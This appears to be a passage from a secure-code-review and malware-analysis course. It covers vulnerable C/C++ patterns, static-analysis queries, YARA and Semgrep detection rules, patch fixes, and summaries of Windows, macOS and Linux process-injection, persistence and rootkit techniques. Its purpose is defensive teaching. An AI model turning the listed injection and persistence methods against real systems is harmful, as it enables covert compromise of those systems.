    // ... if an exception is thrown here, fclose never happens
    risky_function();  // throws
    fclose(f);         // never reached
}
// Fix: use RAII wrapper (unique_ptr with custom deleter, or fstream)

// 16. Virtual function call in constructor/destructor
class Base {
    Base() { init(); }  // calls Base::init, not Derived::init!
    virtual void init();
};
// Can lead to unexpected behavior, not calling overridden method

// 17. Type confusion via bad cast
Base *ptr = get_object();
Derived *d = static_cast<Derived*>(ptr);  // no runtime check!
d->derived_method();  // if ptr isn't actually Derived → UB
// Fix: use dynamic_cast and check for nullptr

Structured Code Review Approach

Top-Down (Architecture → Code)

1. Read documentation, architecture docs, README
2. Identify components and trust boundaries
3. Map IPC and privilege boundaries
4. For each boundary crossing: review input validation
5. For each privileged operation: review authorization
6. Deep dive into complex parsers, crypto, auth logic

Bottom-Up (Dangerous Functions → Callers)

1. grep for dangerous functions:
   strcpy, strcat, sprintf, gets, scanf("%s"), 
   system, popen, exec*,
   printf(var), syslog(LOG_*, var),
   memcpy(dst, src, user_var),
   free(ptr) ... search for ptr usage after

2. For each finding: trace backward to see if input is user-controlled
3. For each confirmed sink: assess impact and write up

Hybrid (Most Effective)

1. Top-down to understand architecture and identify hot spots
2. Bottom-up on hot spots to find specific vulnerabilities
3. Focused testing/fuzzing on confirmed attack surface

Report Format

Use a consistent format for each finding:

Title:           [Short description — e.g., "Stack buffer overflow in config parser"]
Severity:        [Critical / High / Medium / Low / Informational]
Component:       [File and function — e.g., config.c:parse_value()]

Impact:          [What can happen — e.g., "Code execution as the service user (root)"]
Exploitability:  [How practical — e.g., "Requires local access, no mitigations (no canary, no PIE)"]
Remediation:     [Specific fix — e.g., "Replace strcpy with strncpy(dst, src, sizeof(dst)-1); dst[sizeof(dst)-1] = '\0';"]

Overview

Static analysis complements manual code review by automatically finding common vulnerability patterns. It catches low-hanging fruit at scale, but cannot replace human understanding of logic, authorization, and design flaws.

Semgrep Limitations

  • No data flow analysis: Semgrep matches patterns syntactically. It can't track data through function calls or across files.
  • No type awareness: It doesn't know if a variable is user-controlled or a constant.
  • High false positives: Rules like "memcpy with variable size" will flag legitimate uses.
  • Complementary tool: Use Semgrep for enforcement and quick sweeps, CodeQL for deep data flow analysis.

// Find user-controlled argument reaching memcpy length
import cpp
import sdf.DataFlow

from FunctionCall fc, Expr sizeArg
where
  fc.getTarget().hasName("memcpy") and
  sizeArg = fc.getArgument(2) and  // size parameter
  exists(Parameter p |
    p.getFunction().hasName("main") and  // from main's parameters
    DataFlow::localFlow(DataFlow::parameterNode(p), DataFlow::exprNode(sizeArg))
  )
select fc, "memcpy called with potentially user-controlled size"

Sanitizers aren't traditional static analysis — they're runtime checkers. But they're essential complements to static analysis in a security review.

# - Null pointer dereference
# - Division by zero
# - Shift overflow

# Detects data races in multithreaded programs

Triage Rule

A static analysis finding matters when you can explain the full chain:

Source          →  Propagation    →  Sink               →  Violated Invariant  →  Impact
──────            ─────────────     ────                   ──────────────────     ──────
argv[1]        →  copied to buf  →  strcpy(small, buf)  →  bounds not checked  →  stack overflow → RCE
config value   →  parsed as int  →  malloc(val * 4)     →  integer overflow    →  heap overflow → RCE
socket data    →  sprintf format →  printf(buf)         →  format is attacker  →  arbitrary R/W → RCE

Without that chain, treat the finding as a lead, not a confirmed vulnerability. Automated tools can't determine exploitability — that's your job as a reviewer.

YARA Rules and Anti-Analysis Techniques

YARA Overview

YARA is a pattern-matching tool for identifying and classifying malware. Rules describe textual or binary patterns that characterize malware families, exploits, or suspicious behaviors.

Use cases:
- Scan files for known malware indicators
- Classify samples into families
- Hunt for similar samples across large datasets
- Detect suspicious patterns in code review
- Incident response triage

YARA Rule Structure

rule RuleName {
    meta:
        description = "What this rule detects"
        author = "Your name"
        date = "2024-01-01"
        reference = "URL or CVE"
        severity = "high"
        
    strings:
        $text1 = "suspicious string" ascii
        $text2 = "another string" ascii wide   // match both ASCII and UTF-16
        $hex1 = { 48 31 C0 48 31 FF 0F 05 }   // hex byte pattern
        $regex1 = /https?:\/\/[a-z0-9\.\-]+\/[a-z0-9]{32}/ // regex pattern
        
    condition:
        uint32(0) == 0x464C457F and            // file starts with ELF magic
        (2 of ($text*)) and                     // at least 2 text strings match
        $hex1                                   // hex pattern present
}

String Types

Type Syntax Use Case
Text $s = "string" Known strings (URLs, commands, error messages)
Text (case-insensitive) $s = "string" nocase Case-insensitive matching
Wide $s = "string" wide UTF-16LE strings (common in Windows)
ASCII + Wide $s = "string" ascii wide Match both encodings
Hex $h = { 48 8B ?? 41 } Byte patterns with wildcards
Hex (wildcard nibble) $h = { 48 8? C0 } Match with nibble wildcards
Hex (jumps) $h = { 48 31 C0 [2-4] 0F 05 } Variable-length gaps
Regex $r = /pattern/ Complex pattern matching
XOR $s = "string" xor Match XOR'd versions (tries all single-byte keys)
Base64 $s = "string" base64 Match base64-encoded version

Hex Pattern Features

strings:
    // Exact bytes:
    $exact = { 48 31 C0 0F 05 }
    
    // Wildcard byte (?? = any byte):
    $wild = { 48 8B ?? 41 89 ?? }
    
    // Wildcard nibble (? = any nibble):
    $nibble = { 48 8? C0 }       // matches 48 80 C0 through 48 8F C0
    
    // Jump (variable-length gap):
    $jump = { E8 [4] 48 89 C7 }  // CALL + any 4 bytes + MOV RDI, RAX
    $range = { 48 31 C0 [2-10] 0F 05 }  // 2 to 10 bytes between patterns
    
    // Alternation:
    $alt = { (48 31 C0 | 48 33 C0) }    // XOR RAX,RAX or XOR RAX,RAX (different encoding)

Conditions

condition:
    // File type checks:
    uint32(0) == 0x464C457F              // ELF magic
    uint16(0) == 0x5A4D                  // PE magic (MZ)
    uint32(0) == 0xFEEDFACF              // Mach-O 64-bit magic
    
    // String matching:
    all of them                           // ALL strings must match
    any of them                           // ANY string matches
    2 of ($text*)                         // at least 2 strings starting with $text
    3 of ($s1, $s2, $s3, $s4)            // at least 3 of these 4
    
    // File properties:
    filesize < 1MB                        // file size constraint
    filesize > 100KB
    
    // String position:
    $s1 at 0                              // string at offset 0
    $s1 in (0..1024)                      // string in first 1024 bytes
    
    // Count:
    #s1 > 3                               // string $s1 appears more than 3 times
    
    // Combining:
    uint32(0) == 0x464C457F and 
    filesize < 5MB and 
    (2 of ($suspicious*) or $beacon)
    
    // Using modules:
    pe.imports("kernel32.dll", "VirtualAlloc") and
    pe.imports("kernel32.dll", "CreateRemoteThread")

import "elf"
import "math"

rule PackedPE {
    meta:
        description = "Detects packed PE files"
    condition:
        pe.number_of_sections > 0 and
        math.entropy(pe.sections[0].offset, pe.sections[0].size) > 7.0 and

    condition:
        elf.type == elf.ET_EXEC and
        elf.number_of_sections < 5 and
        elf.entry_point < 0x400000
}

Good Rule Design Principles

DO

✓ Use multiple weak indicators instead of one brittle string
✓ Scope by file format when possible (check magic bytes)
✓ Include metadata (author, date, description, reference)
✓ Test against benign files to measure false positives
✓ Use anchored patterns when possible (at specific offsets)
✓ Name rules descriptively (family_variant_technique)
✓ Version your rules
✓ Document what the rule detects and why each string is included

DON'T

✗ Match on overly generic strings ("cmd.exe", "/bin/sh" alone)
✗ Match on common library functions as sole indicator
✗ Write rules that only match packed/encrypted form (won't survive repacking)
✗ Ignore false positive testing
✗ Create rules without file type scoping (wastes scan time)
✗ Match on strings that change between compilations (timestamps, build paths)

Anti-Analysis Techniques

Understanding anti-analysis helps both malware analysts (to bypass them) and code reviewers (to identify evasive code).

Packing and Compression

Purpose: Hide the real code from static analysis

How it works:
1. Original binary is compressed/encrypted
2. A small "stub" is prepended
3. At runtime: stub decompresses/decrypts → original code → executes

Detection:
- High entropy sections (> 7.0)
- Few imports (only what the stub needs)
- Small code section + large data section
- Known packer signatures (UPX!, ASPack, Themida)

Unpacking:
1. Automatic: upx -d packed_binary (for UPX)
2. Manual: Run until OEP (Original Entry Point), dump memory
   - Set breakpoint on VirtualAlloc/mmap (where unpacked code is written)
   - Let unpacking run
   - When execution transfers to new region → that's the OEP
   - Dump from OEP, fix imports

Platform-Specific Malware Techniques

Windows

Process Injection:
- CreateRemoteThread: Allocate memory in target → write shellcode → create thread
- DLL Injection: Force target to load malicious DLL (CreateRemoteThread + LoadLibrary)
- Process Hollowing: Create suspended process → replace memory → resume
- APC Injection: Queue APC to thread in target process
- Atom Bombing: Use global atom table to inject code (no WriteProcessMemory)

Persistence:
- Registry Run keys: HKCU/HKLM\Software\Microsoft\Windows\CurrentVersion\Run
- Scheduled Tasks: schtasks /create
- Services: sc create
- COM Hijacking: Modify CLSID InprocServer32
- WMI Event Subscriptions: Permanent WMI consumers
- Startup Folder: %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
- DLL Search Order Hijacking: Plant DLL in application directory

macOS

Persistence:
- Launch Agents: ~/Library/LaunchAgents/ (user) or /Library/LaunchAgents/ (all users)
- Launch Daemons: /Library/LaunchDaemons/ (root)
- Login Items: System Preferences → Users & Groups → Login Items
- Cron Jobs: crontab -e
- dylib Hijacking: Replace or plant dylib in @rpath search path
- Kernel Extensions: /Library/Extensions/ (requires SIP disable on modern macOS)
- Login/Logout Hooks: defaults write LoginHook

Code Injection:
- DYLD_INSERT_LIBRARIES (blocked by Hardened Runtime)
- task_for_pid + mach_vm_write (requires entitlements)
- Objective-C method swizzling (if code is already loaded)

Linux

Persistence:
- Cron jobs: /etc/crontab, /etc/cron.d/, user crontabs
- Systemd services/timers: /etc/systemd/system/
- rc.local: /etc/rc.local
- Shell profile: .bashrc, .profile, .bash_profile
- SSH authorized_keys: ~/.ssh/authorized_keys
- LD_PRELOAD: /etc/ld.so.preload (requires root)
- Kernel modules: insmod/modprobe
- PAM modules: /etc/pam.d/
- Shared library injection: /etc/ld.so.preload

Rootkit techniques:
- LD_PRELOAD rootkit: Hook libc functions (readdir, stat, open)
- Kernel module: Hook syscall table, hide processes/files
- /proc hiding: Hook getdents to hide entries

Step 6: Write Detection Rules (Phase 5 Skills)

YARA Rules

// capstone/detection/nativevault.yar

rule NativeVault_FormatString {
    meta:
        description = "Detects format string pattern in NativeVault logging"
        severity = "high"
    strings:
        $log_call = "LOG_MESSAGE:"
        $fmt_vuln = { E8 ?? ?? ?? ?? 48 89 C7 E8 }  // call + mov rdi, rax + call printf
    condition:
        uint32(0) == 0x464C457F and
        $log_call and $fmt_vuln
}

rule NativeVault_HardcodedCreds {
    meta:
        description = "Detects hardcoded credentials in NativeVault"
        severity = "critical"
    strings:
        $cred1 = "admin" ascii
        $cred2 = "password123" ascii
    condition:
        uint32(0) == 0x464C457F and
        $cred1 and $cred2 in (@cred1..@cred1+256)
}

Semgrep Rules

# capstone/detection/nativevault-semgrep.yml
rules:
  - id: nativevault-format-string
    pattern: printf($VAR)
    message: "Format string vulnerability: user data as format"
    severity: ERROR
    languages: [c]

  - id: nativevault-command-injection
    patterns:
      - pattern: system($CMD)
      - pattern-not: system("...")
    message: "Command injection: non-constant argument to system()"
    severity: ERROR
    languages: [c]

    pattern: |
      access($PATH, ...);
      ...
      open($PATH, ...);
    message: "TOCTOU: access() before open() on same path"
    severity: WARNING
    languages: [c]

Step 7: Patch the Application

For each vulnerability, apply the specific fix:

Vulnerability Fix
Stack overflow Replace strcpy with strncpy(dst, src, sizeof(dst)-1); dst[sizeof(dst)-1] = '\0';
Use-after-free Set pointer to NULL after free; check before use
Format string Change printf(msg) to printf("%s", msg)
Integer overflow Add overflow check: if (width > SIZE_MAX / height / 4) return ERROR;
TOCTOU Use open() first, then fstat() on the fd
Path traversal Canonicalize path, check it starts with allowed prefix
Command injection Use execve with argument array instead of system()
Weak auth Use bcrypt/argon2 hashing, constant-time comparison
